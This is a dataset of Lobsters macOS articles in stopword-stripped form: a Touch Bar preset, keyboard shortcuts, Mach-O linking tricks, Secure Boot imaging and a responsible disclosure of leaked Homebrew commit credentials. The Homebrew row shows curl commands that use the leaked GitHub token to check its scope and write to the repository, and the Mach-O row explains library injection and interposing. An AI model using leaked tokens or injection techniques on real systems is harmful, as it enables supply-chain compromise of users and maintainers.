application permission likely break lot legitimate application security point view clearly right approach kudos cupertino love blog post tool support via patreon mahalo
278,Lobsters,mac,Apple macOS,GoldenChaos-BTT: A complete Touch Bar UI replacement preset,https://community.folivora.ai/t/goldenchaos-btt-a-complete-touch-bar-ui-replacement-preset/1281,goldenchaosbtt complete touch bar ui replacement preset,blog post goldenchaosbtt http paypalmegoldenchaos use link get github mirror jun release note latest experimental version none install direct import btt upgrade gcbtt help feedback thread screenshots home strip modifier menu dynamic menu bar widget strip widget group modal widget modal widget dock badge setting window previous version note earlier earlier earlier earlier earlier location helper json helper compatible macos mojave version history make cool stuff like zelda map breath wild check project http goldenchaosnet thank trying goldenchaosbtt,love touch bar upset apple sat useless user interface inspired popular blog post subject determined make good promise apple broke spent ridiculous amount time reworking foundation touch bar goldenchaosbtt true general purpose touch bar ui support ton apps intuitive enough make love touch bar likely first time want buy coffee donate http paypalmegoldenchaos thinking buying bettertouchtool preset use link get verified bettertouchtool developer thoroughly tested community download link working try github mirror jun release note fully tested macos big sur new gc macos menu bar item context menu window support busycal always show medium control support sony headphone improvement running app detection performance latest experimental version none newer feature le tested generally stable read release note first install make sure using latest version bettertouchtool follow one two release link top post click direct import btt say yes btt asks want import preset upgrade say yes btt asks want overwrite existing gcbtt set use builtin setting window customize gcbtt liking need help head gcbtt help feedback thread screenshots home strip default key set nothing open fullscreen double escape key tap escape longpress fullscreen open browser browser control appear home strip open apps reveal wide range dynamic control widget close apps dismiss control modifier menu hold command option control access app switcher control strip window snapping control dynamic menu bar dynamic menu bar three size option let dedicate much little space widget like widget strip widget group like emoji picker browser tab replace home strip menu bar modal widget access expandedview modal widget longpressing weather playing reminder calendar volume dock badge dock badge appear left side touch bar remain sticky builtin dock badge support favorite third party apps enable disable gcbtt setting menu dock badge also support handoff setting window straightforward gcbtt setting window make easy deeply customize touch bar restore setting accessible right macos menu bar previous version install latest version unless specific troubleshooting reason need install older version whatever reason make sure version bettertouchtool running greater equal goldenchaosbtt version installing note version earlier require icalbuddy brew install icalbuddy reminder widget work version earlier require icalbuddy brew install icalbuddy calendar reminder widget work version earlier require python request module pip install request locateme brew install locateme weather widget work version earlier require calendar widget first edited include name calendar wish display version earlier require location helper json helper weather widget work compatible macos mojave version history make cool stuff like zelda map breath wild check project http goldenchaosnet thank trying goldenchaosbtt
279,Lobsters,mac,Apple macOS,Customizing Keyboard Shortcuts for any macOS App,https://ishan.co/macos-keyboard-shortcuts,customizing keyboard shortcut macos app,customizing keyboard shortcut macos app productivity august macos sierra create keyboard shortcut apps twitter,customizing keyboard shortcut macos app productivity august reading use keyboard shortcut part daily workflow cut copy paste complicated paste match style shortcut use without even realizing apps allow customize shortcut may find support situation couple week ago needed quick shortcut archive message mail app default shortcut intuitive needed something quick like command searching found macos builtin setting let customize shortcut app need go system preference keyboard shortcut app shortcut add new one either add shortcut specific app system wide shortcut use mail app command numbered list command unnumbered list tweet inspired write post good tip though use want improve quality life second go system app application add paste match style v done ally macdonald allymacdonald august apple documentation prefer detailed step macos sierra create keyboard shortcut apps know tip like go ahead share comment twitter
280,Lobsters,mac,Apple macOS,How I gained commit access to Homebrew in 30 minutes,https://medium.com/@vesirin/how-i-gained-commit-access-to-homebrew-in-30-minutes-2ae314df03ab,gained commit access homebrew minute,http apigithubcomuserrepos http apigithubcomreposhomebrewhomebrewcoregitblobs http mean http time time real persistent threat done http donate project,tested locally see scope token curl http apigithubcomuserrepos u githubapitoken xoauthbasic jq repo fullname permission permission repo brewtestbothomebrewcore permission admin true push true pull true repo homebrewbrew permission admin false push true pull true repo homebrewformulaebrewsh permission admin false push true pull true repo homebrewhomebrewcore permission admin false push true pull true suggested commit access core homebrew repos homebrewbrewhomebrewhomebrewcorehomebrewformulaebrewshjust make sure tested creating blob homebrewhomebrewcore repo curl http apigithubcomreposhomebrewhomebrewcoregitblobs u githubapitoken xoauthbasic content test h contenttype applicationjson sha url http subsequently reported issue homebrew maintainerswhat meanslet put perspective hundred thousand people use homebrew including employee biggest company silicon valleythe frequently installed package last day openssl installed time http direct commit access homebrewhomebrewcore repo time repo protected master branch meaning would able make fastforward change refsheadsmaster anyone freshly installed homebrew ran brew update would malicious formulaeif malicious actor could made small likely unnoticed change openssl formula placing backdoor machine installed itif gain access commit minute could nation state dedicated resource achieve team volunteer many private company network could accessed many could used escalate large scale data breach package management system similar weakness growing concern proven time time package manager credential leak weak point security internet supply chain attack real persistent threat weakness homebrew rather systemic problem industry one need security researchwhat donehomebrew publicly disclosed issue blog http homebrew team worked github audit ensure given access token used maliciously make unexpected commits core homebrew repos want give special thanks mike mcquaid quick professional handling report paternity leaveit clear lot work could done improve security homebrew project use homebrew place work consider asking donate project industry need invest well core os software use depend
282,Lobsters,mac,Apple macOS,Mach-O linking and loading tricks,http://blog.darlinghq.org/2018/07/mach-o-linking-and-loading-tricks.html,macho linking loading trick,http macho transition install name allows circular dependency rearchitectured twolevel symbol namespace introduced sublibraries custom function reexporting symbol look like metasymbols symbol resolvers pseudoop commpage deep inside wrapgen call symbol ordering implemented order file interposing translates darlingmach xtrace us get translated adhoc check,translation post russian available http goal darling project make possible run macos apps linux able load macho binary crucial step achieving early history darling built around custom macho loader idea bridging highlevel darwin apis linux counterpart since focus shifted running code increasingly isolated darwin container since macho transition able use apple original dyld well build many opensource part darwin still maintain simple macho loader used load dyld macho along mach perhaps distinguishing feature darwin various framework library apple ship make extensive use various obscure feature macho provides make dealing macho one important prominent part darling development implementing macho loader building part darwin initially tricky elf real macho understand macho internals much deeper level normally necessary regular developer target darwin without ado let discus trick macho offer install name window linux dynamic library referenced name eg libcso job dynamic linker look library matching name list standard library path contrast darwin somewhat complete path library installation known library install name used presumably done way order prevent dylib hijacking attack malicious dylib get placed library search path real one allows malicious dylib execute arbitrary code behalf executable got tricked loading executables library list full install name dependency dependency macho know install name fact linker know install name use dependency read dependency library linking dylib specify install name using installname dylibinstallname ld option ld libfoodylib fooo installname usrlocalliblibfoodylib link another macho file say libbardylib libfoodylib ld going record libfoo install name usrlocalliblibfoodylib libbar list dependency path dyld look libfoo runtime specifying full path work reasonably well system library indeed placed wellknown location file system library get shipped inside app bundle present problem app could assume going installed applicationsappnameapp app bundle meant portable relocatable exact path library inside known advance darwin solution problem allowing install name start executablepath loaderpath rpath relative main executable path loader executable library directly depends library path list path defined main executable respectively instead always requiring absolute path first two work dependency transitive dependency rpathrelative install name explicitly specify rpath linking executable using ld rpath option many time need ld runme rpath executablepath framework rpath executablepath binlib concept rpath somewhat defies original idea wellknown dylib location allows dylib hijacking attack carried arguably rendering whole topic install name pretty useless circular dependency project span several file normal circular interdependency work fine long file get compiled single binary either library executable work several dynamic library depend might argue instead using circular dependency dynamic library one better reconsider architecture building wo nt wrong one typical thing apple never take time reconsider thing right way prefer keep piling hack trick top particular need make circular dependency work darling various libsystem sublibraries libsystemdyld libsystemkernel libsystempthread depend recently also circularily link cocoa framework appkit core graphic core opengl way cocotron core opengl implemented rearchitectured core opengl implementation got rid circular dependency fundamentally nothing wrong circular dependency dynamic linker already know load library wo nt fall infinite recursion problem direct way link library one linker invocation produce one library linking binary pas dependency already linked linker link one library first moment others yet ready ca nt pas linker trick link simplicity library twice first time tell linker ignore missing dependency indeed pas dependency ld libfoodylib fooo flatnamespace undefined suppress ld libbardylib baro flatnamespace undefined suppress see flatnamespace course try use resulting dylibs directly get dynamic linking error runtime instead relink library second time passing resulting dylibs dependency ld libfoodylib fooo libbardylib ld libbardylib baro libfoodylib time linker able see symbol nt tell ignore error symbol indeed missing get error even though library get linked wrong copy dependency dylibs runtime dyld going see correct one work make sure copy library install name one last detail initialization order code define initializer function using attribute constructor compiler magic list initializers end modinitfunc section inside macho file function invoked dyld upon loading binary reside main invoked normally library initializers run running initializers dependency initializer rely dependency library already set thus ready work guarantee clearly provided circular dependency dyld run initializers order mark dependency upward dependency customize order dyld initialize library somebody marked upward dependency last force libfoo initialized libbar link like ld libfoodylib fooo libbardylib ld libbardylib baro upwardlibrary libfoodylib make convenient darling cmake function named addcircular hard work allows caller simple declarative set dylibinstallname usrlibsystemlibdispatchdylib addcircular libdispatchshared fat source dispatchsrcs sibling systemc systemkernel systemmalloc systemblocks systempthread systemdyld systemduct unwind platform compilerrt upward objc twolevel symbol namespace macho symbol table nt store symbol name also remember library executable symbol come word symbol name namespaced name binary defines hence twolevel namespace level symbol name twolevel namespace introduced prevent symbol name clash normally multiple library defining symbol name would result linktime error nt necessarily work loading library runtime think plugins different library version present linktime runtime problem library use twolevel namespace enables multiple library define symbol name without conflict twolevel namespace turned reverting flat namespace one reason using twolevel namespace implies symbol need resolved link time using undefinedsuppress requires flat namespace seen ld two flag allow disable twolevel namespace link time flatnamespace affect one macho file forceflatnamespace work executables library cause whole process use flat namespace also force dyld use flat namespace runtime setting dyldforceflatnamespace environment variable one caveat using twolevel namespace always explicitly link macho library framework depends example link appkit use foundation explicitly link well another library framework author freely move symbol implementation dependency chain might used able eg possible move code appkit foundation make possible macho ld dyld provide additional feature namely sublibraries reexporting symbol metasymbols sublibraries sublibraries mechanism allows one library called facade umbrella library delegate implementation functionality another library called sublibrary look another way allows library publicly reexport symbol provided another library primary usecase feature libsystem sublibraries reside usrlibsystem used pair library ld libfoodylib fooo lobjc sublibrary libobjc ld libfoodylib fooo reexportlobjc difference make compared linking library lcreexportdylib command get emitted instead usual lcloaddylib particular symbol sublibrary get copied umbrella library link time nt even relinked case new symbol latter added sublibrary runtime lcreexportdylib work similarly lcloaddylib dyld load sublibrary make symbol available others unlike lcloaddylib symbol appear come umbrella library far twolevel namespace concerned really different lcreexportdylib ld behaves link another library libfoo instead looking symbol object dylib file given ld also open inspect reexported sublibrary libobjc example know look thing recorded libfoodylib libobjcdylib install name ld expects find mean library installed proper place use sublibrary anything else work fine system library like libobjc inconvenient plain impossible trying reexport custom sublibrary solve problem ld provides dylibfile option allows specify custom dylib location ld use link time ld libfoodylib fooo reexportlibrary pathtolibsubfoodylib ld libbardylib baro libfoodylib dylibfile executablepathlibfoolibsubfoodylib pathtolibsubfoodylib despite libsystem system library reexporting sublibraries nt see dylibfile used linking every single executable macos system library already installed location matching install name building darling linux however pas number dylibfile path mapping along common argument ld invocation custom function automatically get applied using adddarlinglibrary adddarlingexecutable others reexporting symbol sometimes library need reexport symbol outright everything another library example core foundation reexports nsobject nowadays implemented inside objectivec runtime compatibility reason wondering nsobject ever core foundation instead foundation way tollfree bridging implemented private class wrapping core foundation type eg nscfstring reside core foundation objectivec object still need inherit nsobject perhaps another way could implemented leaving nsobject descendant foundation circularly linking core foundation foundation apple opted move private tollfree bridging helper class along nsobject core foundation thing darling order stay compatible pas list symbol reexport ld using reexportedsymbolslist option echo objcclassnamensobject reexportlistexp ld corefoundation cffileso lobjc reexportedsymbolslist reexportlistexp even though reexporting symbol sound similar reexporting symbol mechanism implemented different sublibraries work special lc dylib command get emitted instead special indirect symbol designated nindir flag inserted nametable behaves symbol provided library library us symbol result second undefined copy symbol name table happens reexports involved one important detail explicitly naming reexported symbol likely want reexport different symbol name different architecture matter fact objectivec name mangling convention abi differ reexport objcclassnamensobject whereas objcclass nsobject objcivar nsobjectisa objcmetaclass nsobject concern using sublibraries available symbol architecture get reexported automatically tool working macho handle fat universal binary one contain submachos several architecture transparently clang build universal binary requested architecture dyld chooses architecture load dylib based architecture executable support tool like ld otool nm work host ie architecture unless explicitly overridden flag thing actually reminds multiple architecture processed get compile error warning twice architecture provide two different reexport list break illusion builtin option ld use different list different architecture mean link dylibs architecture separately combine using lipo ld cffileso arch lobjc reexportedsymbolslist ld cffileso arch lobjc reexportedsymbolslist lipo arch arch create output corefoundation darling use cmake function named addseparatedframework abstract separated linking running lipo real cmake script building core foundation look like addseparatedframework corefoundation currentversion source cfsources version dependency objc system icucore linkflags misc common flag setproperty target appendstring property linkflags wl reexportedsymbolslist cmakecurrentsourcedir setproperty target appendstring property linkflags wl reexportedsymbolslist cmakecurrentsourcedir metasymbols metasymbols yet another feature designed allow apple move symbol library around without breaking old code building macho file always specify earliest version macos support using compiler option similar option io tvos watchos whatever o name apple come product future option control multiple thing instance activates deactivates various availability macro like switch libstdc gnu version libc llvm version c standard library implementation post focus effect linker produced macho particular ld macosxversionmin option note underscore lack extra make emit lcversionminmacosx macho command signal dyld error file loaded earlier o version addition passing macosxversionmin ld also change metasymbols macho file taken account metasymbols symbol name starting ld ld special code path encounter symbol get treated additional command rather symbol name must form ld action condition name condition look like defines o version metasymbol specific symbol effect declared min o version macho linked equal version specified symbol action either add hide installname compatibilityversion causing ld pretend see see symbol given name override install name compatibility version see library one specified name respectively since condition specify version range likely see action repeated many time different o version example list metasymbols libobjc us order hide nsobject code targeting earlier version macos ld hide objcclass nsobject ld hide objcivar nsobjectisa ld hide objcmetaclass nsobject ld hide objcclass nsobject ld hide objcivar nsobjectisa ld hide objcmetaclass nsobject ld hide objcclass nsobject ld hide objcivar nsobjectisa ld hide objcmetaclass nsobject ld hide objcclass nsobject ld hide objcivar nsobjectisa ld hide objcmetaclass nsobject ld hide objcclass nsobject ld hide objcivar nsobjectisa ld hide objcmetaclass nsobject ld hide objcclass nsobject ld hide objcivar nsobjectisa ld hide objcmetaclass nsobject ld hide objcclass nsobject ld hide objcivar nsobjectisa ld hide objcmetaclass nsobject ld hide objcclass nsobject ld hide objcivar nsobjectisa ld hide objcmetaclass nsobject unlikely going find feature useful code knowing work may help decipher cryptic error missing symbol symbol clearly symbol resolvers one rather interesting feature dyld support symbol resolvers way customizing process resolving symbol write symbol resolver special function implement custom logic order find address symbol dyld executes runtime symbol requested using symbol resolvers requires tricky ld flag entirely code assembly level create symbol resolvers using symbolresolver pseudoop two different implementation foo movl eax ret movl eax ret symbolresolver foo check condition call condition jz movq rax ret movq rax ret also need foo present symbol table value matter replaced whatever resolver return global foo foo special compiler support c level use inline assembly achieve c static int return static int return int foo go nt matter return static void fooresolver asm symbolresolver foo return condition assembly code read foo instead foo darwin name mangling convention c prepend c symbol name underscore premachotransition darling prepend strip back underscore working elf file lot pain deal since content foo nt matter neither name resolver label assembly listing normally combine foo fooresolver one function definition like void foo asm symbolresolver foo return condition one downside may result error foo prototype different header file specifies return generic pointer rather int also note magic done nt particularly robust dlsym foo call return original address foo one decided matter case address resolver might make sense make one potential foo implementation act foo symbol care case one imagine sort creative way feature used apple use libplatform select efficient implementation locking primitive runtime based detected cpu count feature define osvariantresolver v attribute visibility osstringify v extern void void void void asm symbolresolver osstringify vaargs define osvariantupmpresolver v osvariantresolver v c void uintptrt commpagecpucapabilities c kup extern void osvariant void return osvariant else extern void osvariant mp void return osvariant mp macro generate resolvers check runtime whether machine single cpu core indicated kup flag present cpu capability descriptor commpage instance slightly efficient spinlock implementation used check done per symbol loaded symbol bound directly selected implementation zero performance cost per call darling additionally use symbol resolvers even ambitious goal allow macho library transparently use linux elf library installed host computer libcairo first step make using elf library work libelfloader simple elf loader implementation enough functionality sucessfully load ldlinux linux counterpart dyld jump ldlinux loading actual elf library need build libelfloader macho install usrlibdarlinglibelfloaderdylib inside darwin chroot directory way directly used darwin code one important detail libelfloader intentionally merge macho elf symbol namespaces apart one pointer elfcalls stashed deep inside libsystem darwin thing remain blissfully unaware several linux elf library mapped somewhere address space darwin linux world coexist surprisingly peacefully inside one process particular us c library libsystemc glibc respectively get access elf symbol darwin world one use libelfloader api incantation like elfcalls dlsymfatal elfcalls dlopenfatal xopendisplay next tool called wrapgen make using elf symbol easier way transparent enables u use thirdparty code like cocotron may expect call linux library directly without major patch given name elf library eg wrapgen retrieves list symbol automatically generates code like include elfcallsh extern struct elfcalls elfcalls static void libhandle attribute constructor static void initializer libhandle elfcalls dlopenfatal attribute destructor static void destructor elfcalls dlclosefatal libhandle void xopendisplay asm symbolresolver xopendisplay return elfcalls dlsymfatal libhandle xopendisplay build code macho library install macho library link magically made macho naturally cmake function called wrapelf make invoking wrapgen building stub macho installing usrlibnative breeze call wrapelf library link simply another macho library able load call linux library easily transparently feel like superpower already mentioned past darling used thin compatibility layer almost directly mapping darwin library call onto linux library call day long gone darling conforming darwin implementation rather darwin port thanks part fact able directly reuse large portion darwin original source code like libsystem dyld xnu launchd part willingness implement many undocumented detail code requires like commpage mentioned lowlevel part stack libsystemkernel deal reality actually running top linux kernel code ever see regular darwin environment linux gnulinux userland nowhere found directly easily reaching native linux library connecting service running linux host x server feel like pulling rabbit hat like witnessing magic trick libelfloader symbol resolvers wrapgen trickery magic trick get le impressive learn work symbol ordering reason rely specific order symbol end macho file instruct ld arrange precisely order think relying insane apple course think different writing list symbol require specific order order special file called order file passing file ld like ld libfoodylib fooo orderfile fooorder unlike reexportedsymbolslist option mentioned orderfile support simple list name comment explicitly specify object file symbol belongs otherwise private static c parlance symbol name get duplicated object file fooo also make symbol entry apply specified architecture wo nt need use separate linking manually apply lipo reexporting symbol make sense reorder symbol precisely block code data designated symbol nothing relies able fall content one symbol directly content next technique frequently used manually written assembly code compiler prefer rely make clear code file rely ability compiler normally emit special assembly directive subsectionsviasymbols mark generated macho file symbol freely reordered stripped unused one place apple rely symbol reordering implementation tollfree bridging libdispatch libdispatch implement object model o object huge amount macro spread several source file model certain degree compatible objectivec object model libdispatch also implement tollfree bridging unlike core foundation ability cast libdispatch object directly objectivec object send message would real objectivec object notably possible cast dispatchdatat object directly nsdata use various cocoa apis way around tollfree bridging implemented using enormous amount hack require objectivec class symbol corresponding o object vtables laid certain order instance dispatchobjecttfb macro check whether objectivec object originates libdispatch tollfree bridged class comparing isa vtables dispatchobject object define dispatchobjecttfb f slowpath uintptrt osobj osobjisa slowpath class osobj osobjisa class osobjectvtable dispatchobject slowpath class osobj osobjisa class osobjectvtable object return f vaargs order file use force kind symbol ordering libdispatch interposing usual way forcibly replacing implementation function content symbol use dyldinsertlibraries environment variable make dyld load given macho file process give higher priority symbol name resolution course higher priority wo nt work binary use twolevel namespace useful combination dyldforceflatnamespace usecases replacing function implementation include replacement implementation wrapping original implementation invoke original implementation wrapper wrapper would normally use dlsym call rtldnext flag like int open const char path int flag modet mode printf called open n path virtual symlink strcmp path foo path bar int originalopen const char int modet originalopen dlsym rtldnext open return originalopen path flag mode addition dyld provides another way replace symbol called dyld interposing loaded macho contains interpose section dyld treat content pair pointer pair command replace symbol implementation one one hand method requires environment variable enough library contain interpose section sometimes referred implicit interposing hand interpose section explicitly express intent replace symbol implementation insert library dyld behave smarter particular dyld interposing work twolevel namespace require original replacement symbol name match top dyld smart enough make symbol name still refer original implementation used inside replacement macho file static int myopen const char path int flag modet mode printf called open n path virtual symlink strcmp path foo path bar call original implementation despite open place invoking myopen return open path flag mode place pair pointer interpose section attribute section data interpose static struct void replacement replacee replacepair myopen open note replacee pointer like reference symbol different file actually get stored macho dummy value corresponding entry relocation table relocation entry reference target symbol name dyld get full possibly namespaced name symbol apply interposing alternatively private function called dylddynamicinterpose allows dynamically interposing symbol typedef struct void replacement replacee replacementtuple extern const struct machheader dsohandle extern void dylddynamicinterpose const struct machheader const replacementtuple replacement sizet count void interpose replacementtuple replacepair myopen open dylddynamicinterpose dsohandle replacepair course pointer replacee code save runtime symbol get replaced continue pointing original symbol dyldinsertlibraries dyld interposing nt nearly useful working objectivec code c partly hard directly reference objectivec method implementation imp partly objectivec provides mean replacing method implementation namely method swizzling isa swizzling darling use interposing implementation detail xtrace tool tracing emulated system call darwin program make darwin system call two kind bsd syscalls socalled mach trap calling libsystemkernel actual userspace side syscall abi implemented darling customized version libsystemkernel translates darwin syscalls regular linux syscalls invocation darlingmach linux kernel module emulates mach kernel side strace popular tracing tool show syscalls linux process make using strace darwin executable running darling produce trace linux syscalls darwin syscall emulation code make well linux syscalls loaded elf library make directly useful mapping linux syscalls darwin syscalls nt always straightforward oftentimes may preferable see darwin syscalls program make go emulation layer tracer xtrace unlike strace requires cooperation tracee due using ptrace api xtrace need hook syscall emulation layer inside tracee process us dyldinsertlibrariesusrlibdarlinglibxtracedylib replacing trampoline function inside syscall emulation layer one log syscall made result xtrace advanced strace come formatting argument return value display enough basic info useful darling xtrace arch machtimebaseinfotrap machtimebaseinfotrap kernsuccess issetugid issetugid hostselftrap hostselftrap port right machmsgtrap machmsgtrap kernsuccess kernelrpcmachportdeallocatetrap kernelrpcmachportdeallocatetrap kernsuccess ioctl ioctl ioctl ioctl writenocancel writenocancel exit see process make bsd mach syscalls write exit simply mapped linux version others require complex translation instance mach trap translated various ioctls devmach device implemented kernel module bsd ioctl call made stdio determine kind file stdin stdout refer case tty get translated readlink ing file procselffd examining result could nt cover every macho feature without risking making post long dyld source code briefly mention writing plugin application loaded runtime may need link dylib hold plugin code executable application ld allows using bundleloader option besides install name lcloaddylib lcreexportdylib lcdylibid command include pair number socalled compatibility current version library compatibility version earliest version current version compatible set current compatibility version dylib link using ld currentversion compatibilityversion option respectively runtime dyld discovers present copy library current version le required compatibility version refuse load library separately compatibility current version macho file also optionally declare source version work via separate command lcsourceversion version set using ld sourceversion option influence whether get included resulting macho using addsourceversion nosourceversion option embedding infoplist content directly section named infoplist allows codesign singleexecutable program separate infoplist file implemented using adhoc check inside securityframework mean supported usual cfbundle nsbundle apis nt allow make proper singleexecutable apps finally worth noting addition trick mentioned ld dyld also contain various hack behave slightly differently system library libsystem particular activated testing library install name hardcoded prefix like usrlib
283,Lobsters,mac,Apple macOS,Booting Secure,http://michaellynn.github.io/2018/07/27/booting-secure/,booting secure,somewhat busy new new provisioning reality netinstall netboot boot external medium based device enrollment program dep note let talk security level security full security guids single recoverypreboot volume required within container file format note silver searcher ripgrep freshly reinstalled o ecid growing evidence new process whoa shsh protocol medium security deleting file round could copy yes get blocked boot cool detail lifespan imaging dead thought yet autodmg within recovery read ecid target disk mode attached device million dollar question install macos organization google restor greg neagle bootstrappr via mdm deployed profile organization feel need image device simply putting file disk good enough reason postscript,howdy long time somewhat busy macbook pro exists hear ship secure boot hear might freaking written blog post read mind one written secure boot device community tech article new article apple even older kb article got updated trivia bit importantly may completely destroyed entire macos imaging provisioning workflow new provisioning reality change effectively mean person responsible mac setup workflow secure boot device chip fresh box configured full security mode netinstall netboot netsus bsdpy serverapp netinstall service none work use n key startup boot network imaging workflow use option key startup select network boot target boot external medium usb thunderbolt etc use option key startup select different attached disk boot unless device provisioningconfiguration workflow based device enrollment program dep light touch automated provisioning workflow find incompatible device exception cover workflow based bootable attached medium since network boot really dead dead dead go enable make sure external boot medium created even boot device macbook pro run custom fork example boot machine normally complete setup assistant first user creation process setting password reboot recovery open secure startup utility allow booting external medium either set security leave full medium may require network connectivity apple reboot external medium begin workflow exactly light touch anymore let go let talk secure boot requires machine note blog post cover every aspect secure boot checking cover new useful technical detail mike let talk security level security putting one first easiest talk simply put closest classic boot model knew normal stuff applies device firmware able see bootefi use volume read boot o inside volume say support hardware foremost stored systemlibrarycoreservicesplatformsupportplist ever wondered provide necessary hardware kexts talking bit computer secure boot device come additional requirement chip run o bridgeos yadda yadda yadda boot mode interested reading normal o compatible boot mac situation full security different mode let investigate ask secure boot device booting let start bless command sudo bless getboot verbose lot information never noticed macos device boot apfs like secure boot device macos booting file system volume booting bootefi file new apfs preboot volume find inside apfs container key bllastbsdname key string string key path key string string matter encrypted device every macos device booting apfs filesystem boot like see container layout command diskutil apfs list come triplet ossystem volume preboot recovery booted system volume within apfs container also see temporary vm volume taken place mounted privatevarvm booting preboot since trying figure different secure boot device preboot volume older mac without chip look different comparison let mount see o booted internal disk usually diskutil mount mount volumespreboot look top level disk see one folder look like long hex string dash guids guids guids match output saw diskutil apfs list system volume within apfs container unique guid within preboot recovery volume well top level folder contain folder name matching guid system volume paired volume apfs volume disk role specific role name macintosh hd caseinsensitive mount point l l volumespreboot total drwxrxrx root wheel jul hf boot model kernel hardcoded look recovery partition partition id minus associated system partition apfs single apfs container contain multiple system volume single recoverypreboot volume required within container contain multiple guidnamed folder one system volume looking back information got bless command see bootefi subfolder within guid folder systemlibrarycoreservicesbootefi key path key string string boot target secure boot device maybe something related secure boot process quite file preboot volume maybe could compare device running o version without chip record mean comparing imac pro macbook pro running let chop guid name beginning since unique every system volume compare content subdirectory sort line run diff command standardlistingtxt securebootlistingtxt comappleinstallerbootefi comappleinstallerbridgeversionbin comappleinstallerbridgeversionplist comappleinstallercomapplebootplist comappleinstallerplatformsupportplist comappleinstallersystemversionplist systemlibrarycoreservicesrootuuid systemlibrarycoreservicesbootefi wow different file secure boot device file google interesting hit file format manifest file structured tag file contains signature o component used apple os including io let go back apple description full security startup mac verifies integrity operating system o startup disk make sure legitimate sound like something signature would useful information unique mac ensures mac start o trusted apple oh might different look yet another imac pro good thing access compare sure enough additional file device hex string suffix different well think part security signature let start basic experimentation rename case need file note target disk mode fun filesystem protection want play home mike extra grin let poke comment make sure network disconnected reboot mac connect internet display alert internet connection required annnnnnd bingo would seem part equation reconnecting device network later checking preboot would seem new file recreated interestingly one rebuilds uniquely named file always hex name appear different every time remade checksum keep changing static record instead likely dynamic signature needing network access order created maybe static hex string unique identifier sort try searching machine identifier maybe find normally kind thing want search entire content machine reach standard tool like silver searcher ripgrep tool gladly recursively search text binary file locate string interested guy get frequent shoutouts reverse engineering talk however case dumbly lucked trying naive approach checking see output systemprofiler list unique identifier like ethernet mac address serial number etc happened contain hex string question freshly reinstalled o systemprofiler tends include recent portion several log file instance included installlog apecid also apboardid maybe ec ecid let try good friend iphone wiki maybe know ecid ecid possibly standing exclusive chip id electronic chip id identifier unique every unit ton detail page likely lot educated guess nonapple people likely applies secure boot mac play around tool suggestion find looking basically thing growing evidence new process secure boot mac new unique identifier io device time ecid would appear signature manifest generated part secure boot process full mode make signature specific ecid device good tidbit log near whoa know entire new process called personalization know url reaching http friendly hit wiki site url shsh protocol wow sending data request section look similar detail mac sending hostplatforminfo apecid etc locking pretty solid apple leveraged technology generating signature validated booting secure boot mac knowing know play little bit help confirm file unique device generated copying secure boot device renaming match ecid device still result secure boot wanting repair signature going back macbook pro secure boot uniquely named file generic file bootefi happens delete still boot apparently device secure boot rely checkvalidate file boot process let take one last bit log help confirm signature indeed file pretty clear proof result personalization process saved file path medium security allows version signed operating system software ever trusted apple run startup medium security turned mac verifies o startup disk making sure properly signed apple mention information unique mac let set medium delete uniquely named file reboot hmmmmmmm booted directory structure exact match macbook pro longer file ecid hex identifier file one without ecid name maybe relying deleting file round soon yes run alert dialog o longer trusted bootable need repair let expand thought process statement information unique mac could copy macbook pro secure boot back imac pro secure boot get imac pro booting answer yes repeating experiment time copying file machine running get blocked boot know generic file o specific knowing found far let loop back look file wiki page found mentioning interesting note bottom mentioning file simply encoded let run openssl find cool detail embedded cert coming apple secure boot root ca validating signature lot letter field bord chip etc probably related one attribute like saw supplied installlog personalization service interesting ecid field definitely present full security mode manifest missing medium security manifest yet confirmation tied specific hardware would seem imply unlike full security mode medium security mode could simply place already generated correct manifest disk without access internet devicespecific personalization need occur one complete set signature file good o whatever hardware compatible phrase air gapped imaging come mind mentioned let talk context imaging lifespan imaging dead thought yet u community spoken quite well already early first release day imac pro talk use asr restore o image device boot box however fortunate enough two imac pro brave enough try internet recovery could apparently image bother check back news tried recently making never booted image wonderful tool like autodmg day asr definitely restore booting macos onto device even host device running asr restore secure boot device changed imac pro came running special fork uncommon new hardware build current o time macos build released unified build imac pro longer ran fork using knowledge personalization look asr command see may changed let try favorite builtin tooling peek binary string otool string usrsbinasr grep personaliz nopersonalization could nt personalize volume personalization failed error line nopersonalize personalizationrequiredforvolumeatmountpoint networkavailableforpersonalizationwithoptions personalizevolumeatmountpointforinstall outputdirectory option completionhandler otool l usrsbinasr grep personaliz systemlibraryprivateframeworksospersonalizationframeworkversionsaospersonalization compatibility version current version would appear asr gained new trick fact asr imac pro copy already new capability worked device device within recovery asr macos version capability without need special undocumented flag trick tinker little deeper like find code ospersonalization privateframework read ecid target disk mode attached device allows personalize device even full security mode ecidspecific devicespecific manifest million dollar question image apple tell blatantly install macos organization apple recommend support monolithic system imaging installation method system image might include modelspecific information firmware update read apple recommend support say recommend supported quite obviously built functionality asr hard beat speed target disk mode restore autodmg built image secure boot device support target disk mode box mean restore personalized image secure boot device boot first try suddenly light touch hold boot workflow back amazing tool starting available like google restor someone need worry delivered device manipulated midshipment try placing simple launchdaemon secure boot device system volume stop booting full security mode one thing signature manifest honestly billion place o could modified autolaunch thing root start secure boot check thing check thing yet focused right securing core boot process situation instead internet recovery guess many machine could restored back vanilla something like restor amount time system image might include modelspecific information firmware update warning something consider definite change o installer work going image restoring workflow consider portion device may necessary software restoring anything last o version ran make effective probably need keep fleet device top o update make sure restoration image latest o version patch time also alternative project light touch still drastically le running setup assistant create account destroy example greg neagle bootstrappr boot recovery type two command race work provisioning clean machine bringing device back user redeployed wipe restore machine pristine state deal filevault encrypted disk etc still looking something like internet recovery return device new state secure boot macos device still new definitely corner edge around concept imaging surely stumbled yet apple recommend support think read line apple understands right organization may feel need workflow still apple continues similar path done io could eventually possibly split o volume possibly even read image mutable user data stored separately ever get state security concern evaporate o device one trusted verified deeper state macos today could even gain erase content setting functionality nobody apple know next meantime provide guidance guidance looking depmdmbased workflow provisioning latest operating system version already include feature like managing automatic kernel extension loading done remotely adjusted postdeployment via mdm deployed profile siu capability make network bootable image ran scutil reconfigure trust setting moot secure boot device network boot mdm game organization feel need image device know simply putting file disk good enough reason mdm mdmdeployed agent aware likely long term solution definitely meantime getting mdm going environment always hope help mike postscript access macbook pro look preboot volume see two different similar file version macos instead file also see file going back installlog find line quick google search suggest likely internal model identifier either imac pro specific chip inside little poking around find new macbook pro device would indicate signature generic medium mode still need exist specific secure boot device model attempting boot
